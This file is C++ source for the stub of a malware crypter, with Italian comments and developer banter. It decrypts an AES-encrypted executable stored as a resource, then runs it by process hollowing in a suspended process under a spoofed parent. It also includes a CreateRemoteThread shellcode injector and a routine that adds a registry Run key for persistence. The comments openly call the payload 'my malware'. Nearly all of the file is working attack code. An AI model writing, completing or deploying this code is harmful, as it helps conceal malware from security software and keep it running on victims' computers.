#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>
#include <tlhelp32.h>



int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


//funzione che prende le risorse di un PE
unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) { 
    HGLOBAL hResData; 
    HRSRC   hResInfo; // handle to resource info in hModule
    unsigned char* pvRes; // pointer to resource data buffer
    HMODULE hModule = GetModuleHandle(NULL); // handle to DLL module

    // find the resource Load the resource and lock it
    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL)) 
    {
        *dwSize = SizeofResource(hModule, hResInfo); //mi salvo la grandezza delle risorse
        return 	pvRes;
    }
    // quit if no resource found
    *dwSize = 0;
    return 0;
}


/*typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;
  HANDLE hThread;
  DWORD  dwProcessId;
  DWORD  dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;*/
//GUARDA LA MIA STREAM, PRENDERE UN PROCESSO TRA QUELLI SEMPRE ATTIVI TIPO QUESTI .EXE
//!!!!!!!
int FindTarget(const char *procname) { //zi compila bho
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
            
    while (Process32Next(hProcSnap, &pe32)) {
            if (lstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    CloseHandle(hProcSnap);
            
    return pid;
}
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

bool CreateProcessWithParent(DWORD parentId, PWSTR commandline,STARTUPINFOA* sia, PROCESS_INFORMATION* pi) {
    printf("Prima di OpenProcess");
    auto hProcess = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentId);
    printf("Dopo di OpenProcess");
    //probabilmente hProcess ritorna falso perche' esce senza errori o robe troppo strane

    if (!hProcess){
        printf("ahahahahahah\n");
        return false;
    }  
    SIZE_T size;
    //
    // call InitializeProcThreadAttributeList twice
    // first, get required size
    //
    ::InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
 
    //
    // now allocate a buffer with the required size and call again
    //
    auto buffer = std::make_unique<BYTE[]>(size);
    auto attributes = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(buffer.get());
    ::InitializeProcThreadAttributeList(attributes, 1, 0, &size);
 
    //
    // add the parent attribute
    //
    printf("\nPrima di UpdatePorcThead\n");
    ::UpdateProcThreadAttribute(attributes, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
        &hProcess, sizeof(hProcess), nullptr, nullptr);
 
    //
    STARTUPINFOEXA si = { sizeof(si) };
    

    printf("a metà\n") ;
    si.StartupInfo = *sia;
    si.lpAttributeList = attributes;
    //
    // create the process
    //
    printf("\nPrima di CreateProcess\n");//FAMME RIVEDE DOVE SI E' BLOCCATO
//compila sto schifo    in che senso ho fatto crypter malware
//ce sta un po dispendioso, cosa? dovresti far iterare quella su tutto il disco finche non trova c.exe e poi ritornare il path
//potremmo semplicemente hardcodare il path dell eseguibile (tipo svchost.exe o in questo caso c.exe)
//CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI) non sta nella funzione
    BOOL created = ::CreateProcess((LPCSTR)"C:\\Users\\leona\\OneDrive\\Desktop\\Crypter\\crypter_ultrasw3g\\c.exe", NULL, NULL, NULL, //glielo passamo?
        FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, 
        (STARTUPINFOA*)&si, pi);
 
    //no grazie alcazzo, comunque siamo riusciti ad aprire un handle al processo remoto, mr fagiano
    // cleanup
    //
    ::CloseHandle(hProcess); 
    ::DeleteProcThreadAttributeList(attributes); //ahahah no, secondo me faila rica 163 pefforza
 
    return created;
}

void CreateRunKey(char *path){
    if(TRUE){  //AGGIUNGERE argomento da linea di comando
            printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
            HKEY hkey = NULL;
            // malicious app
            const char* exe = path;

            // startup
            LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
            if (res == ERROR_SUCCESS) {
                // create new registry key
                RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                RegCloseKey(hkey);
            }     
        }
}


void RunPE_proc(void *pe){
    char currentFilePath[1024];
    IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
    IMAGE_NT_HEADERS64* NtHeader; // NT header ovvero i successivi 248 byte del nostro malware e secondo header del PE
    IMAGE_SECTION_HEADER* SectionHeader; // Section header ovvero i successivi 40 byte del nostro malware e header delle sezioni del PE

    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.

    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare

//BASTA CERCARE IL TUO ESEGUIBILE C.EXE FAGIANOOO
//cojone l'ho fatto   COMPILA QUESTO E RUNNA, PROVA
    void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE    int pid FindTarget("svchost.exe");//prova a compila
    int pid = FindTarget("c.exe"); //si, prova a compilare e runnare, pero' potrebbe comunque non funzionare, forse e' un processo a cui non abbiamo accesso
    
    
////////////////////////
///////////////////////// 

    DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
    // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header

    //checko se il NT header e' valido: dal msdn:
    //Signature:
    //A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".

    printf("magic number DOS_header: %d", DOSHeader->e_magic);

    printf("\nprima del check della signature");
    printf("\nNtHeader: %p", (void*)NtHeader);
    printf("\nNtHeader->Signature: %d", NtHeader->Signature);
    printf("\nIMAGE_NT_SIGNATURE: %d", IMAGE_NT_SIGNATURE);

    Sleep(3000);
    if(NtHeader->Signature == IMAGE_NT_SIGNATURE){
        ZeroMemory(&PI, sizeof(PI)); // pulisco la memoria della struct PROCESS_INFORMATION e STARTUPINFOA
        ZeroMemory(&SI, sizeof(SI));
        //al posto di NULL posso specificare il path di un altro file .exe valido come ad esempio notepad.exe
        printf("\nPRIMA GetModuleFileNameA");
        Sleep(3000);  


        GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo

        //CreateRunKey(currentFilePath);


        printf("\n\nDOPO GetModuleFileNameA");
        Sleep(3000);     
        /*BOOL CreateProcessA(
            [in, optional]      LPCSTR                lpApplicationName,
            [in, out, optional] LPSTR                 lpCommandLine,
            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
            [in]                BOOL                  bInheritHandles,
            [in]                DWORD                 dwCreationFlags,
            [in, optional]      LPVOID                lpEnvironment,
            [in, optional]      LPCSTR                lpCurrentDirectory,
            [in]                LPSTARTUPINFOA        lpStartupInfo,
            [out]               LPPROCESS_INFORMATION lpProcessInformation
        );*/
        //creo processo in stato sospeso e salvo i valori nelle struct SI e PI
        
        if (CreateProcessWithParent(pid, nullptr,&SI,&PI)) {//sara' UDP con perdita pacchetti ahahahaha
            printf("porcoidocidoodcidoodicdoooooooooooo!//!///!/!///!//!/!//!!/!/!//!");
            // alloco memoria per la struct CONTEXT
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
            CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare
            /*BOOL GetThreadContext(
            [in]      HANDLE    hThread,
            [in, out] LPCONTEXT lpContext
            );*/
            printf("\nDOPO Aver creato il processo(Prima di GetThreadContext)");
            Sleep(3000);
            //ormai il thread si puo' accesere da PI.hThread perche 
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) { // prendo i registri del processo che vogliamo attaccare 
                //VirtualAllocEx alloca memoria in un processo esterno dal corrente
                printf("\nPrimaDi VirtualAllocEx");

                pImageBase = VirtualAllocEx( // alloco memoria nel processo che vogliamo attaccare
                        PI.hProcess,
                        LPVOID(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,   // alloco la stessa memoria che occupa il malware
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
                );
        //WriteProcessMemory Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.


        /*BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
        );*/
            printf("\nprima di WriteProcessMemory");

            // scrivo il mio PE malware nella memoria che ho allocato nel processo
            WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL); 
            // assegno e alloco tutte le sezioni del PE nella memoria che ho allocato nel processo
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    /*typedef struct _IMAGE_SECTION_HEADER {
                    BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
                    union {
                        DWORD PhysicalAddress;
                        DWORD VirtualSize;
                    } Misc;
                    DWORD VirtualAddress;
                    DWORD SizeOfRawData;
                    DWORD PointerToRawData;
                    DWORD PointerToRelocations;
                    DWORD PointerToLinenumbers;
                    WORD  NumberOfRelocations;
                    WORD  NumberOfLinenumbers;
                    DWORD Characteristics;
                    } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;*/


                    // prendo l' i-esima sezione del PE
                    //per calcolarmi l'offset faccio cosi:
                    //ricordiamo (DWORD64(pe) + DOSHeader->e_lfanew) = indirizzo del NT header 
                    //perche' sommo 264 + i*40? perche' 264 e' l' offset del primo section header rispetto all' inizio del NT header, e' i*40? perche' ogni section header e' lungo 40 byte
                    //STA ROBA E' ASSURDA, PER FARSELA DA SOLI TOCCHEREBBE METTERSI A DEBUGGARE LA ROBA O USARE PE-BEAR
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
                    //scrivo le varie sezioni del mio PE malware
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),//sempre usare virtualAddress, ricorda che l' indirizzo fisico e' dinamico per la allocazione dinamica
                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                    );
                    //NNON NE HO LA MINIMA IDEA
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(CTX->Rdx + 0x10),
                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
                            8,
                            NULL
                    );

                }


    
                // setto il registro Rcx del processo  all' entry point del PE malware
                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                printf("prima di SetThreadContext"); //ARRIVATA FIN QUI NEL CHILLING MA ASPE, POTREBBE ESSE CHE IL MIO MALWARE NON HA LA FINESTRA
                //CONTROLLA SE CE STANNO SOTTO PROCESSI ATTIVI A C.EXE

//HA FUNZIONATTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO ahahahahahahahaha
//che dici, bho prova a runnare un ultima volta e vediamo se spawna il processo, per sicurezza

//pusha er file cmq  adesso?? o dopo dopo, testa un secondo adesso se spawna un altro procesos di c.exe
                //setto il contesto (i registri del Process Control Bloc)
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));

                //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                ResumeThread(PI.hThread);

                WaitForSingleObject(PI.hProcess, NULL);

            }
        }
    }
}

void RunPE_self(void* pe){

    char currentFilePath[1024];

    IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
    IMAGE_NT_HEADERS64* NtHeader; // NT header ovvero i successivi 248 byte del nostro malware e secondo header del PE
    IMAGE_SECTION_HEADER* SectionHeader; // Section header ovvero i successivi 40 byte del nostro malware e header delle sezioni del PE

    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.

    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare


    void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE

////////////////////////
///////////////////////// 
    DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
    // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header

    //checko se il NT header e' valido: dal msdn:
    //Signature:
    //A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".

    printf("magic number DOS_header: %d", DOSHeader->e_magic);

    printf("\nprima del check della signature");
    printf("\nNtHeader: %p", (void*)NtHeader);
    printf("\nNtHeader->Signature: %d", NtHeader->Signature);
    printf("\nIMAGE_NT_SIGNATURE: %d", IMAGE_NT_SIGNATURE);

    Sleep(3000);
    if(NtHeader->Signature == IMAGE_NT_SIGNATURE){
        ZeroMemory(&PI, sizeof(PI)); // pulisco la memoria della struct PROCESS_INFORMATION e STARTUPINFOA
        ZeroMemory(&SI, sizeof(SI));
        //al posto di NULL posso specificare il path di un altro file .exe valido come ad esempio notepad.exe
        printf("\nPRIMA GetModuleFileNameA");
        Sleep(3000);  
        GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
        printf("\n\nDOPO GetModuleFileNameA");
        Sleep(3000);     
        /*BOOL CreateProcessA(
            [in, optional]      LPCSTR                lpApplicationName,
            [in, out, optional] LPSTR                 lpCommandLine,
            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
            [in]                BOOL                  bInheritHandles,
            [in]                DWORD                 dwCreationFlags,
            [in, optional]      LPVOID                lpEnvironment,
            [in, optional]      LPCSTR                lpCurrentDirectory,
            [in]                LPSTARTUPINFOA        lpStartupInfo,
            [out]               LPPROCESS_INFORMATION lpProcessInformation
        );*/
        //creo processo in stato sospeso e salvo i valori nelle struct SI e PI
        if(TRUE){  //AGGIUNGERE argomento da linea di comando
            printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
            HKEY hkey = NULL;
            // malicious app
            const char* exe = currentFilePath;

            // startup
            LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
            if (res == ERROR_SUCCESS) {
                // create new registry key
                RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                RegCloseKey(hkey);
            }     
        }
        if (CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI)) {

            // alloco memoria per la struct CONTEXT
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
            CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare
            /*BOOL GetThreadContext(
            [in]      HANDLE    hThread,
            [in, out] LPCONTEXT lpContext
            );*/
            printf("\nDOPO Aver creato il processo(Prima di GetThreadContext)");
            Sleep(3000);
            //ormai il thread si puo' accesere da PI.hThread perche 
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) { // prendo i registri del processo che vogliamo attaccare 
                //VirtualAllocEx alloca memoria in un processo esterno dal corrente
                printf("\nPrimaDi VirtualAllocEx");

                pImageBase = VirtualAllocEx( // alloco memoria nel processo che vogliamo attaccare
                        PI.hProcess,
                        LPVOID(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,   // alloco la stessa memoria che occupa il malware
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
            );
        //WriteProcessMemory Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.


        /*BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
        );*/
            printf("\nprima di WriteProcessMemory");

            // scrivo il mio PE malware nella memoria che ho allocato nel processo
            WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL); 
            // assegno e alloco tutte le sezioni del PE nella memoria che ho allocato nel processo
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    /*typedef struct _IMAGE_SECTION_HEADER {
                    BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
                    union {
                        DWORD PhysicalAddress;
                        DWORD VirtualSize;
                    } Misc;
                    DWORD VirtualAddress;
                    DWORD SizeOfRawData;
                    DWORD PointerToRawData;
                    DWORD PointerToRelocations;
                    DWORD PointerToLinenumbers;
                    WORD  NumberOfRelocations;
                    WORD  NumberOfLinenumbers;
                    DWORD Characteristics;
                    } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;*/


                    // prendo l' i-esima sezione del PE
                    //per calcolarmi l'offset faccio cosi:
                    //ricordiamo (DWORD64(pe) + DOSHeader->e_lfanew) = indirizzo del NT header 
                    //perche' sommo 264 + i*40? perche' 264 e' l' offset del primo section header rispetto all' inizio del NT header, e' i*40? perche' ogni section header e' lungo 40 byte
                    //STA ROBA E' ASSURDA, PER FARSELA DA SOLI TOCCHEREBBE METTERSI A DEBUGGARE LA ROBA O USARE PE-BEAR
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
                    //scrivo le varie sezioni del mio PE malware
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),//sempre usare virtualAddress, ricorda che l' indirizzo fisico e' dinamico per la allocazione dinamica
                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                    );
                    //NNON NE HO LA MINIMA IDEA
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(CTX->Rdx + 0x10),
                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
                            8,
                            NULL
                    );

                }


    
                // setto il registro Rcx del processo  all' entry point del PE malware
                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                printf("prima di SetThreadContext");

                //setto il contesto (i registri del Process Control Bloc)
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                printf("prima di ResumeThread");

                //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                ResumeThread(PI.hThread);
                printf("prima di WaitForSingleObject");

                WaitForSingleObject(PI.hProcess, NULL);

            }
        }
    }

}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(){
    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
    unsigned long malwareLen;
    unsigned long keyLen;

    unsigned char* key;

    //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
    key = GetResource(420,"BIN", &keyLen);

    for(int i = 0; i< 32; i++){
        printf("%x\n", key[i]);
    }
    unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
    memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
    printf("%d",malwareLen);

    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe

    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
    Sleep(1500);
    for(int i = 0; i < 2000; i++){
        printf("%c", malware[i]);
    }
    Sleep(3000);
    //Adesso arriva la roba strana del RunPE

    printf("prima degli header");
    
    // DA AGGIUSTAREEEEEEE
    /*char stringa1[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
    char stringa2[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
    char stringa3[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
    char currentFilePathArr[3][100]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
    strcpy(currentFilePathArr[0], stringa1);
    strcpy(currentFilePathArr[1], stringa2);
    strcpy(currentFilePathArr[2], stringa3);

    HANDLE th[3];


    for(int i = 0; i < 3; i++){ 


        RunPEArgs args;
        args.pe = pe;
        args.currentFilePath = currentFilePathArr[i];

        th[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPE, &args, 0, NULL);

    }*/
    //WaitForMultipleObjects(3, th, TRUE, INFINITE);



    //RunPE_self(pe);
    RunPE_proc(pe);

    return 0;
}

